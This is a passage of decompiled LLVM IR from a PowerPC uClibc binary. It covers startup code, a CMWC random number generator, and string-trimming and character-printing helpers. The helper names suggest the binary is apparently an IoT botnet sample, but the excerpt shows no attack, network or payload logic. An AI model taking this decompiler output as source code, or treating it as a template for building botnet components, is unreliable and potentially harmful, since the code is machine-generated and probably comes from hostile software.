@global_var_10009b0c.311 = constant i32 939589631
@global_var_10009bc0.312 = constant i32 939524118
@global_var_10011be0.313 = constant [8 x i8] c"Success\00"
@global_var_10011bd0.314 = constant [15 x i8] c"Unknown error \00"
@global_var_1001286e.315 = constant i32 1
@global_var_1002350c.316 = local_unnamed_addr global i32* @global_var_1001286e.315
@global_var_10023550.317 = global i32 0
@global_var_100295b0.318 = global i32 0
@global_var_1002978c.319 = global i32 0
@global_var_100295c0.320 = global i32 0
@global_var_10023498.321 = global i32 0
@global_var_1002357c.322 = local_unnamed_addr global i32 0
@global_var_10029878.323 = global i32 0
@global_var_1000a92c.324 = constant [3 x i8] c"8`\00"
@global_var_1000aa10.325 = constant i32 939524098
@global_var_1000aa50.326 = constant [3 x i8] c"8`\00"
@global_var_1000ac58.327 = constant i32 939524118
@global_var_1000ace0.328 = constant i32 939524118
@global_var_100297d0.329 = global i32 0
@global_var_100297a0.330 = global i32 0
@global_var_10023500 = external global i32
@global_var_10029850.333 = global i32 0
@global_var_1000af3c.334 = constant i32 939524108
@global_var_1000afd4.335 = constant [3 x i8] c"8`\00"
@global_var_1000b080.336 = constant [3 x i8] c"8`\00"
@global_var_1000b3a8.337 = constant i32 1207959640
@global_var_1000b3e4.338 = constant i32 1207959580
@global_var_100233c8.339 = global i32 0
@global_var_100233e0 = external global i32
@global_var_10023400.341 = global i32 -1726662223
@global_var_100233e8.342 = local_unnamed_addr global i32* @global_var_10023400.341
@global_var_100233e4.343 = global i32* @global_var_10023400.341
@global_var_1001273c.344 = constant i32 0
@global_var_1000b6fc.345 = constant i32 939524118
@global_var_1000bb10.346 = constant i32 939524130
@global_var_1002347c.347 = global i32 0
@global_var_10023554.348 = local_unnamed_addr global i32 0
@global_var_1000bba4.349 = constant i32 1207960437
@global_var_1002355c.350 = local_unnamed_addr global i32 0
@global_var_10023000.351 = global i32 -1
@global_var_10023564.352 = local_unnamed_addr global i32 0
@global_var_10023568.353 = local_unnamed_addr global i32 0
@global_var_10012764.354 = constant [10 x i8] c"/dev/null\00"
@global_var_1002356c.355 = local_unnamed_addr global i32 0
@global_var_10023558.356 = local_unnamed_addr global i32 0
@global_var_1000c2c4.357 = constant i32 939524096
@global_var_1000c2e0.358 = constant i32 939524096
@global_var_10023590.359 = local_unnamed_addr global i32 0
@global_var_10023574.360 = global i32 0
@global_var_1000c69c.361 = constant i32 939524180
@global_var_1000c9b8.362 = constant i32 939524105
@global_var_10012a98.363 = constant [4 x i8] c"inf\00"
@global_var_10012a9b.365 = constant i32 4804166
@global_var_10012aa8.366 = constant i32 771763200
@global_var_100297b8.368 = global i32 0
@global_var_10023578.369 = local_unnamed_addr global i32 0
@global_var_1000d96c.371 = constant i32 1207960848
@global_var_10023580.372 = local_unnamed_addr global i32 0
@global_var_10012af8.373 = constant i32 771751936
@global_var_10029868.374 = global i32 0
@global_var_1000da5c.375 = constant [3 x i8] c"8a\00"
@global_var_1000da68.376 = constant i32 939524097
@global_var_1000db3c.377 = constant i32 939524097
@global_var_1000dc10.378 = constant i32 939524097
@global_var_1000dc3c.379 = constant i32 939524100
@global_var_1000dd1c.380 = constant i32 1207959684
@global_var_1000de98.381 = constant i32 939589631
@global_var_10012b14.382 = constant i32 1912602624
@global_var_10012b00.383 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_10012b18.384 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_10012b30.385 = constant [11 x i8] c"nameserver\00"
@global_var_10012b3c.386 = constant [7 x i8] c"domain\00"
@global_var_10012b44.387 = constant [7 x i8] c"search\00"
@global_var_1000e1d0.388 = constant i32 1207959568
@global_var_1000e1d8.389 = constant i32 939524099
@global_var_100234b0.390 = global i32 0
@global_var_1000e338.391 = constant i32 939524129
@global_var_10023584.392 = local_unnamed_addr global i32 0
@global_var_1000e3ac.393 = constant [3 x i8] c"8`\00"
@global_var_1000e3e4.394 = constant i32 939524129
@global_var_10023588.395 = local_unnamed_addr global i32 0
@global_var_1002358c.396 = local_unnamed_addr global i32 0
@global_var_1000e7c0.397 = constant i32 939524171
@global_var_1000e870.398 = constant i32 939524105
@global_var_1000ec0c.399 = constant [3 x i8] c"8`\00"
@global_var_10012b60.400 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1000ee04.401 = constant [3 x i8] c"9 \00"
@global_var_1000ee10.402 = constant i32 939524193
@global_var_1000ee78.404 = constant i32 939524101
@global_var_1000ef64.405 = constant i32 939524124
@global_var_1000efdc.406 = constant i32 1207960116
@global_var_1000eff4.407 = constant i32 939524105
@global_var_1000f16c.408 = constant [3 x i8] c"9 \00"
@global_var_10012b74.409 = constant [3 x i8] c"%x\00"
@global_var_1000f1f8.410 = constant i32 939524124
@global_var_1000f21c.411 = constant i32 939524193
@global_var_10012b78.412 = constant [11 x i8] c"/etc/hosts\00"
@global_var_10012b84.413 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1000f908.414 = constant i32 1207959560
@global_var_1000f9a0.415 = constant i32 939589631
@global_var_10023004.416 = global i32 0
@global_var_10023594.2 = local_unnamed_addr global i8 0
@global_var_10023530.47 = local_unnamed_addr global i8 0
@global_var_10023531.48 = local_unnamed_addr global i8 0
@global_var_10023532.49 = local_unnamed_addr global i8 0
@global_var_10023533.50 = local_unnamed_addr global i8 0
@global_var_100231d0.275 = global i16 288
@global_var_10023220.276 = local_unnamed_addr global i16 272
@global_var_10023494.370 = local_unnamed_addr global i16 1
@global_var_1001143c.244 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_10023594.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1002301c.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1002301c.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1002301c.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_10023594.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_10023594.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_10023010.9, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_10023010.9 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268462544, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 add (i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32 -916), i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_100235b0.10, align 4
  %v1_10000260 = add i32 %arg1, -1640531527
  store i32 %v1_10000260, i32* @global_var_100235b4.11, align 4
  %v1_10000278 = add i32 %arg1, 1013904242
  store i32 %v1_10000278, i32* @global_var_100235b8.12, align 4
  br label %dec_label_pc_10000294

dec_label_pc_10000294:                            ; preds = %entry, %dec_label_pc_10000294
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_100002fc, %dec_label_pc_10000294 ]
  %v1_1000029c = mul i32 %storemerge12, 4
  %v2_100002ac = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_100235b0.10 to i32), i32 -12)
  %v1_100002b0 = inttoptr i32 %v2_100002ac to i32*
  %v2_100002b0 = load i32, i32* %v1_100002b0, align 4
  %v2_100002c8 = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_100235b0.10 to i32), i32 -8)
  %v1_100002cc = inttoptr i32 %v2_100002c8 to i32*
  %v2_100002cc = load i32, i32* %v1_100002cc, align 4
  %v2_100002d0 = xor i32 %storemerge12, -1640531527
  %v2_100002d8 = xor i32 %v2_100002d0, %v2_100002b0
  %v1_100002e0 = xor i32 %v2_100002d8, %v2_100002cc
  %v2_100002f0 = add i32 %v1_1000029c, ptrtoint (i32* @global_var_100235b0.10 to i32)
  %v2_100002f4 = inttoptr i32 %v2_100002f0 to i32*
  store i32 %v1_100002e0, i32* %v2_100002f4, align 4
  %v1_100002fc = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_100002fc, 4096
  br i1 %tmp7, label %dec_label_pc_10000294, label %dec_label_pc_10000310

dec_label_pc_10000310:                            ; preds = %dec_label_pc_10000294
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000029c, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10000294, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  store i32 18782, i32* %r10.global-to-local, align 4
  %v3_10000348 = load i32, i32* @global_var_1002319c.13, align 4
  %v1_1000034c = add i32 %v3_10000348, 1
  %v1_10000350 = urem i32 %v1_1000034c, 4096
  store i32 %v1_10000350, i32* @global_var_1002319c.13, align 4
  %v1_1000036c = mul nuw nsw i32 %v1_10000350, 4
  %v2_10000370 = add i32 %v1_1000036c, ptrtoint (i32* @global_var_100235b0.10 to i32)
  %v1_10000374 = inttoptr i32 %v2_10000370 to i32*
  %v2_10000374 = load i32, i32* %v1_10000374, align 4
  %v6_10000398 = udiv i32 %v2_10000374, 228675
  %v2_1000039c = mul i32 %v2_10000374, 18782
  %v3_100003ac = load i32, i32* @global_var_10023198.14, align 4
  %v2_100003b8 = add i32 %v3_100003ac, %v2_1000039c
  %v3_100003b8 = icmp ult i32 %v2_100003b8, %v3_100003ac
  %v4_100003bc = zext i1 %v3_100003b8 to i32
  %v5_100003bc = add nuw nsw i32 %v4_100003bc, %v6_10000398
  store i32 %v5_100003bc, i32* %r10.global-to-local, align 4
  %v2_100003ec = add i32 %v5_100003bc, %v2_100003b8
  %v2_10000400 = icmp ult i32 %v2_100003ec, %v5_100003bc
  br i1 %v2_10000400, label %dec_label_pc_10000408, label %dec_label_pc_10000428

dec_label_pc_10000408:                            ; preds = %entry
  %v1_1000040c = add i32 %v2_100003ec, 1
  %v1_1000041c = add nuw nsw i32 %v5_100003bc, 1
  br label %dec_label_pc_10000428

dec_label_pc_10000428:                            ; preds = %entry, %dec_label_pc_10000408
  %storemerge = phi i32 [ %v1_1000041c, %dec_label_pc_10000408 ], [ %v5_100003bc, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_1000040c, %dec_label_pc_10000408 ], [ %v2_100003ec, %entry ]
  store i32 %storemerge, i32* @global_var_10023198.14, align 4
  store i32 %v1_10000350, i32* %r10.global-to-local, align 4
  %v2_10000438 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10000438, i32* %v1_10000374, align 4
  %v0_10000458 = load i32, i32* %r10.global-to-local, align 4
  %v1_10000458 = mul i32 %v0_10000458, 4
  %v2_1000045c = add i32 %v1_10000458, ptrtoint (i32* @global_var_100235b0.10 to i32)
  %v1_10000460 = inttoptr i32 %v2_1000045c to i32*
  %v2_10000460 = load i32, i32* %v1_10000460, align 4
  ret i32 %v2_10000460

; uselistorder directives
  uselistorder i32 %v5_100003bc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v3_100003ac, { 1, 0 }
  uselistorder i32 %v2_10000374, { 1, 0 }
  uselistorder i32 %v1_10000350, { 2, 0, 1 }
  uselistorder i32* @global_var_100235b0.10, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100235b0.10 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10000428, { 1, 0 }
}

define i32 @trim(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000049c = call i32 @__GI_strlen()
  store i32 %v0_1000049c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100004c0

dec_label_pc_100004b4:                            ; preds = %dec_label_pc_100004c0
  %v1_100004b8 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_100004c0

dec_label_pc_100004c0:                            ; preds = %entry, %dec_label_pc_100004b4
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_100004b8, %dec_label_pc_100004b4 ]
  %v2_100004cc = add i32 %stack_var_-36.0, %arg1
  %v3_100004cc = inttoptr i32 %v2_100004cc to i8*
  %v3_100004d0 = load i8, i8* %v3_100004cc, align 1
  %v4_100004d0 = zext i8 %v3_100004d0 to i32
  store i32 %v4_100004d0, i32* %r3.global-to-local, align 4
  %v3_100004e0 = call i32 @isspace(i32 %v4_100004d0, i32 %v2_100004cc)
  store i32 %v3_100004e0, i32* %r3.global-to-local, align 4
  %v3_100004e8 = icmp eq i32 %v3_100004e0, 0
  br i1 %v3_100004e8, label %dec_label_pc_10000500.preheader, label %dec_label_pc_100004b4

dec_label_pc_10000500.preheader:                  ; preds = %dec_label_pc_100004c0
  %v1_100004a8 = add i32 %v0_1000049c, -1
  %v2_100005087 = icmp slt i32 %v1_100004a8, %stack_var_-36.0
  br i1 %v2_100005087, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_100004f4:                            ; preds = %dec_label_pc_10000510
  %v1_100004f8 = add i32 %stack_var_-40.010, -1
  %v2_10000508 = icmp slt i32 %v1_100004f8, %stack_var_-36.0
  br i1 %v2_10000508, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_10000510:                            ; preds = %dec_label_pc_10000500.preheader, %dec_label_pc_100004f4
  %stack_var_-40.010 = phi i32 [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %v1_100004a8, %dec_label_pc_10000500.preheader ]
  %v2_1000051c = add i32 %stack_var_-40.010, %arg1
  %v3_1000051c = inttoptr i32 %v2_1000051c to i8*
  %v3_10000520 = load i8, i8* %v3_1000051c, align 1
  %v4_10000520 = zext i8 %v3_10000520 to i32
  store i32 %v4_10000520, i32* %r3.global-to-local, align 4
  %v3_10000530 = call i32 @isspace(i32 %v4_10000520, i32 %v2_1000051c)
  store i32 %v3_10000530, i32* %r3.global-to-local, align 4
  %v3_10000538 = icmp eq i32 %v3_10000530, 0
  br i1 %v3_10000538, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_100004f4

dec_label_pc_1000058c.preheader:                  ; preds = %dec_label_pc_100004f4, %dec_label_pc_10000510, %dec_label_pc_10000500.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %v1_100004a8, %dec_label_pc_10000500.preheader ], [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %stack_var_-40.010, %dec_label_pc_10000510 ]
  %v3_100005943 = icmp sgt i32 %stack_var_-36.0, %stack_var_-40.0.lcssa
  br i1 %v3_100005943, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000054c:                            ; preds = %dec_label_pc_1000058c.preheader, %dec_label_pc_1000054c
  %v2_100005b06 = phi i32 [ %v2_100005b0, %dec_label_pc_1000054c ], [ %arg1, %dec_label_pc_1000058c.preheader ]
  %storemerge15 = phi i32 [ %v1_10000584, %dec_label_pc_1000054c ], [ %stack_var_-36.0, %dec_label_pc_1000058c.preheader ]
  %v2_10000570 = add i32 %storemerge15, %arg1
  %v1_10000574 = inttoptr i32 %v2_10000570 to i8*
  %v2_10000574 = load i8, i8* %v1_10000574, align 1
  %v3_1000057c = inttoptr i32 %v2_100005b06 to i8*
  store i8 %v2_10000574, i8* %v3_1000057c, align 1
  %v1_10000584 = add i32 %storemerge15, 1
  %v3_10000594 = icmp sgt i32 %v1_10000584, %stack_var_-40.0.lcssa
  %v2_100005a4 = sub i32 %v1_10000584, %stack_var_-36.0
  %v2_100005b0 = add i32 %v2_100005a4, %arg1
  br i1 %v3_10000594, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000059c:                            ; preds = %dec_label_pc_1000054c, %dec_label_pc_1000058c.preheader
  %v2_100005b0.lcssa = phi i32 [ %arg1, %dec_label_pc_1000058c.preheader ], [ %v2_100005b0, %dec_label_pc_1000054c ]
  %v3_100005b8 = inttoptr i32 %v2_100005b0.lcssa to i8*
  store i8 0, i8* %v3_100005b8, align 1
  %v0_100005d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100005d0

; uselistorder directives
  uselistorder i32 %v1_10000584, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100004a8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 6, 3, 5, 4, 0 }
  uselistorder i32 %arg1, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_1000054c, { 1, 0 }
  uselistorder label %dec_label_pc_1000058c.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000510, { 1, 0 }
  uselistorder label %dec_label_pc_100004c0, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100005e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_100005f4 = icmp eq i32 %v0_100005e8, 0
  br i1 %v3_100005f4, label %dec_label_pc_10000628, label %dec_label_pc_100005fc

dec_label_pc_100005fc:                            ; preds = %entry
  %v1_10000600 = inttoptr i32 %v0_100005e8 to i32*
  %v2_10000600 = load i32, i32* %v1_10000600, align 4
  %v1_1000060c = trunc i32 %arg2 to i8
  %v3_1000060c = inttoptr i32 %v2_10000600 to i8*
  store i8 %v1_1000060c, i8* %v3_1000060c, align 1
  %v2_10000614 = load i32, i32* %v1_10000600, align 4
  %v1_10000618 = add i32 %v2_10000614, 1
  store i32 %v1_10000618, i32* %v1_10000600, align 4
  %v0_10000650.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_10000628:                            ; preds = %entry
  %v2_10000628 = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268437052, i32* @lr, align 4
  %v2_10000638 = call i32 @__libc_write(i32 1, i32 %v2_10000628)
  store i32 %v2_10000638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_1000063c:                            ; preds = %dec_label_pc_100005fc, %dec_label_pc_10000628
  %v0_10000650 = phi i32 [ %v0_10000650.pre, %dec_label_pc_100005fc ], [ %v2_10000638, %dec_label_pc_10000628 ]
  ret i32 %v0_10000650

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000063c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp45 = icmp slt i32 %arg3, 1
  br i1 %tmp45, label %dec_label_pc_10000718, label %dec_label_pc_10000694

dec_label_pc_10000694:                            ; preds = %entry
  %v2_100006c426 = load i8, i8* %arg2, align 1
  %v3_100006cc29 = icmp eq i8 %v2_100006c426, 0
  br i1 %v3_100006cc29, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006a8:                            ; preds = %dec_label_pc_10000694, %dec_label_pc_100006a8
  %v4_100006c031 = phi i32 [ %v1_100006b8, %dec_label_pc_100006a8 ], [ %tmp, %dec_label_pc_10000694 ]
  %stack_var_-20.030 = phi i32 [ %v1_100006ac, %dec_label_pc_100006a8 ], [ 0, %dec_label_pc_10000694 ]
  %v1_100006ac = add i32 %stack_var_-20.030, 1
  %v1_100006b8 = add i32 %v4_100006c031, 1
  %v5_100006bc = inttoptr i32 %v1_100006b8 to i8*
  %v2_100006c4 = load i8, i8* %v5_100006bc, align 1
  %v3_100006cc = icmp eq i8 %v2_100006c4, 0
  br i1 %v3_100006cc, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006d4:                            ; preds = %dec_label_pc_100006a8, %dec_label_pc_10000694
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10000694 ], [ %v1_100006ac, %dec_label_pc_100006a8 ]
  %v2_100006dc = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_100006dc, label %dec_label_pc_100006f0, label %dec_label_pc_10000700

dec_label_pc_100006f0:                            ; preds = %dec_label_pc_100006d4
  %v2_100006f8 = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10000700

dec_label_pc_10000700:                            ; preds = %dec_label_pc_100006d4, %dec_label_pc_100006f0
  %storemerge3 = phi i32 [ %v2_100006f8, %dec_label_pc_100006f0 ], [ 0, %dec_label_pc_100006d4 ]
  %v1_10000704 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10000708 = icmp eq i32 %v1_10000704, 0
  br i1 %v3_10000708, label %dec_label_pc_10000718, label %dec_label_pc_10000710

dec_label_pc_10000710:                            ; preds = %dec_label_pc_10000700
  br label %dec_label_pc_10000718

dec_label_pc_10000718:                            ; preds = %dec_label_pc_10000700, %entry, %dec_label_pc_10000710
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_10000700 ], [ %storemerge3, %dec_label_pc_10000710 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10000700 ], [ 48, %dec_label_pc_10000710 ]
  %v1_1000071c = urem i32 %arg4, 2
  %v3_10000720 = icmp eq i32 %v1_1000071c, 0
  br i1 %v3_10000720, label %dec_label_pc_10000750.preheader, label %dec_label_pc_10000790.preheader

dec_label_pc_10000750.preheader:                  ; preds = %dec_label_pc_10000718
  %v2_1000075419 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_1000075419, label %dec_label_pc_1000072c.lr.ph, label %dec_label_pc_10000790.preheader

dec_label_pc_1000072c.lr.ph:                      ; preds = %dec_label_pc_10000750.preheader
  %v2_10000734 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_1000072c

dec_label_pc_1000072c:                            ; preds = %dec_label_pc_1000072c.lr.ph, %dec_label_pc_1000072c
  %stack_var_-32.122 = phi i32 [ %stack_var_-32.0, %dec_label_pc_1000072c.lr.ph ], [ %v1_10000748, %dec_label_pc_1000072c ]
  %v3_10000734 = call i32 @printchar(i32* %v2_10000734, i32 %stack_var_-16.0)
  %v1_10000748 = add nsw i32 %stack_var_-32.122, -1
  %v2_10000754 = icmp sgt i32 %stack_var_-32.122, 1
  br i1 %v2_10000754, label %dec_label_pc_1000072c, label %dec_label_pc_10000790.preheader

dec_label_pc_10000790.preheader:                  ; preds = %dec_label_pc_1000072c, %dec_label_pc_10000750.preheader, %dec_label_pc_10000718
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10000718 ], [ 0, %dec_label_pc_10000750.preheader ], [ %stack_var_-32.0, %dec_label_pc_1000072c ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000718 ], [ %stack_var_-32.0, %dec_label_pc_10000750.preheader ], [ 0, %dec_label_pc_1000072c ]
  %v2_1000079410 = load i8, i8* %arg2, align 1
  %v3_1000079c13 = icmp eq i8 %v2_1000079410, 0
  br i1 %v3_1000079c13, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760.lr.ph

dec_label_pc_10000760.lr.ph:                      ; preds = %dec_label_pc_10000790.preheader
  %v2_10000774 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000760

dec_label_pc_10000760:                            ; preds = %dec_label_pc_10000760.lr.ph, %dec_label_pc_10000760
  %v4_1000079016 = phi i32 [ %tmp, %dec_label_pc_10000760.lr.ph ], [ %v1_10000788, %dec_label_pc_10000760 ]
  %stack_var_-36.015 = phi i8* [ %arg2, %dec_label_pc_10000760.lr.ph ], [ %v5_1000078c, %dec_label_pc_10000760 ]
  %stack_var_-12.114 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000760.lr.ph ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_10000764 = load i8, i8* %stack_var_-36.015, align 1
  %v3_10000764 = zext i8 %v2_10000764 to i32
  %v3_10000774 = call i32 @printchar(i32* %v2_10000774, i32 %v3_10000764)
  %v1_1000077c = add i32 %stack_var_-12.114, 1
  %v1_10000788 = add i32 %v4_1000079016, 1
  %v5_1000078c = inttoptr i32 %v1_10000788 to i8*
  %v2_10000794 = load i8, i8* %v5_1000078c, align 1
  %v3_1000079c = icmp eq i8 %v2_10000794, 0
  br i1 %v3_1000079c, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760

dec_label_pc_100007cc.preheader:                  ; preds = %dec_label_pc_10000760, %dec_label_pc_10000790.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000790.preheader ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_100007d05 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_100007d05, label %dec_label_pc_100007a8.lr.ph, label %dec_label_pc_100007d8

dec_label_pc_100007a8.lr.ph:                      ; preds = %dec_label_pc_100007cc.preheader
  %v2_100007b0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_100007a8

dec_label_pc_100007a8:                            ; preds = %dec_label_pc_100007a8.lr.ph, %dec_label_pc_100007a8
  %stack_var_-32.38 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_100007a8.lr.ph ], [ %v1_100007c4, %dec_label_pc_100007a8 ]
  %v3_100007b0 = call i32 @printchar(i32* %v2_100007b0, i32 %stack_var_-16.0)
  %v1_100007c4 = add nsw i32 %stack_var_-32.38, -1
  %v2_100007d0 = icmp sgt i32 %stack_var_-32.38, 1
  br i1 %v2_100007d0, label %dec_label_pc_100007a8, label %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge

dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge: ; preds = %dec_label_pc_100007a8
  %tmp46 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_100007d8

